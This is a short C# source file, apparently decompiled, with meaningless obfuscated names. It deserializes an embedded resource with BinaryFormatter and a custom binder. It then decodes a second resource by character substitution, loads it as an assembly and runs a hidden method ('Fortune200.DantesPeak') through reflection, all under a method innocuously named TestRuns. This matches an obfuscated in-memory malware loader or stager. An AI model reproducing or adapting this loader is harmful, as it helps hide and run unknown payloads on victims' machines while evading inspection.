using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using Microsoft.VisualBasic.CompilerServices;
using yepbmhhl;

public class Class1
{
	public delegate object BaseFactorySt(string ink);

	public delegate object Unfty(string ink);

	public delegate object DandyLinos(byte[] ink);

	public delegate object BungoWongs(object obj, object[] obj2);

	public delegate object GundisFudos(string mo);

	private static FoodistTaphinia _updatedFoodistTaphinia;

	public static Delegate VentureOIff;

	[STAThread]
	public static void Main()
	{
		StreamingContext context = new StreamingContext(StreamingContextStates.All);
		BinaryFormatter binaryFormatter = new BinaryFormatter(null, context);
		binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
		binaryFormatter.Binder = new JumboJelly();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jonnas_Envy2001.xml");
		_updatedFoodistTaphinia = binaryFormatter.Deserialize(manifestResourceStream) as FoodistTaphinia;
		TestRuns();
	}

	public static object Cambris(string source)
	{
		source = source.Replace("|", "");
		source = source.Replace("&", "A").Replace("^", "/").Replace("#", "0")
			.Replace("$", "B")
			.Replace("!", "C")
			.Replace("(", "=");
		return source;
	}

	public static void TestRuns()
	{
		VentureOIff = Delegate.CreateDelegate(typeof(BaseFactorySt), (MethodInfo)_updatedFoodistTaphinia.Falian);
		byte[] array = (byte[])VentureOIff.DynamicInvoke(RuntimeHelpers.GetObjectValue(Cambris(Resources.oskiflgjkd_xml)));
		VentureOIff = Delegate.CreateDelegate(typeof(DandyLinos), (MethodInfo)_updatedFoodistTaphinia.Dopey);
		VentureOIff.DynamicInvoke(array);
		MethodBase methodBase = null;
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			if (Operators.CompareString(assembly.GetName().Name, "oskiflgjkd", false) == 0)
			{
				VentureOIff = Delegate.CreateDelegate(typeof(GundisFudos), assembly.GetType("Fortune200", throwOnError: true), (MethodInfo)_updatedFoodistTaphinia.Fallensi, throwOnBindFailure: true);
				methodBase = VentureOIff.DynamicInvoke("DantesPeak") as MethodBase;
				VentureOIff = Delegate.CreateDelegate(typeof(BungoWongs), methodBase, (MethodInfo)_updatedFoodistTaphinia.Jophns, throwOnBindFailure: true);
				VentureOIff.DynamicInvoke(null, null);
			}
		}
	}
}
